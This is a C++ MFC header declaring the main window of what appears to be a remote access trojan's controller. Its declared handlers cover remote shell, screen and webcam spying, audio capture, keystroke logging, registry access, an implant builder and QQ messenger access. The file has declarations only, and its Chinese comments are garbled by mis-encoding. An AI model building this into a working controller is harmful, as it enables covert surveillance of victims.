// MainFrm.h : interface of the CMainFrame class
//
/////////////////////////////////////////////////////////////////////////////

#if !defined(AFX_MAINFRM_H__8341639A_B7C3_4A82_967E_DEB461FB2048__INCLUDED_)
#define AFX_MAINFRM_H__8341639A_B7C3_4A82_967E_DEB461FB2048__INCLUDED_
#include "DataStatus.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

class CMainFrame : public CXTPFrameWnd
{
	
protected: // create from serialization only
	CMainFrame();
	DECLARE_DYNCREATE(CMainFrame)
	CXTPDockingPaneManager  m_paneManager;

	CString strStatusBar;
// Attributes
public:
	void Activate(UINT nPort, UINT nMaxConnections);
	static void CALLBACK NotifyProc(ClientContext* pContext, UINT nCode);
	static void ProcessReceiveComplete(ClientContext *pContext);
	static void ProcessReceive(ClientContext *pContext);
	void ShowToolTips(LPCTSTR lpszText);
	CXTPDockingPane* CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour = NULL);
	CMap<UINT,UINT, CWnd* , CWnd*> m_mapPanes;

// Operations
public:
	int nOSCount [10];
	void ShowConnectionsNumber();
	CDataStatus  m_wndDlgBar;
	void LoadIcons();  //”“º¸≤Àµ•œ‘ æÕº±Í
    int OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl);

// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CMainFrame)
	virtual BOOL PreCreateWindow(CREATESTRUCT& cs);
	//}}AFX_VIRTUAL
//	BOOL m_bSetRestart;

// Implementation
public:
	virtual ~CMainFrame();
#ifdef _DEBUG
	virtual void AssertValid() const;
	virtual void Dump(CDumpContext& dc) const;
#endif

protected:  // control bar embedded members
	CStatusBar  m_wndStatusBar;
	CXTPTrayIcon m_TrayIcon;

// Generated message map functions
protected:
	//{{AFX_MSG(CMainFrame)
	afx_msg int OnCreate(LPCREATESTRUCT lpCreateStruct);
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	afx_msg void OnMenuitemShow();
	afx_msg void OnMenuitemHide();
	afx_msg void OnClose();
	afx_msg void OnTools();
	afx_msg void OnMenuitemSetting();
	afx_msg void OnMenuitemBuild();
	afx_msg void OnTimer(UINT nIDEvent);
	afx_msg void OnMenuitemUpdateIp();
	afx_msg void OnPopup();

	//}}AFX_MSG
	afx_msg void OnCustomize();
/*
	afx_msg int OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl);
	afx_msg void OnPopup();*/

	afx_msg LRESULT OnRemoveFromList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenManagerDialog(WPARAM /*wParam*/, LPARAM /*lParam*/);
	afx_msg LRESULT OnOpenShellDialog(WPARAM, LPARAM);
	afx_msg	LRESULT OnOpenScreenSpyDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenWebCamDialog(WPARAM, LPARAM);
	afx_msg	LRESULT	OnOpenAudioDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenSystemDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnModifyList(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenBuildDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenKeyBoardDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenServiceDialog(WPARAM, LPARAM);
    afx_msg	LRESULT	OnOpenRegeditDialog(WPARAM, LPARAM);
    afx_msg	LRESULT	OnOpenTextChatDialog(WPARAM, LPARAM);
    afx_msg	LRESULT	OnOpenProxyMapDialog(WPARAM, LPARAM);
	afx_msg LRESULT OnOpenChatDialog(WPARAM,LPARAM);     //ºÙ«–∞Ê
	afx_msg LRESULT OnDockingPaneNotify(WPARAM wParam, LPARAM lParam);
	afx_msg LRESULT OnOpenQQBoxDialog(WPARAM wParam, LPARAM lParam);


	DECLARE_MESSAGE_MAP()
};

/////////////////////////////////////////////////////////////////////////////

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_MAINFRM_H__8341639A_B7C3_4A82_967E_DEB461FB2048__INCLUDED_)
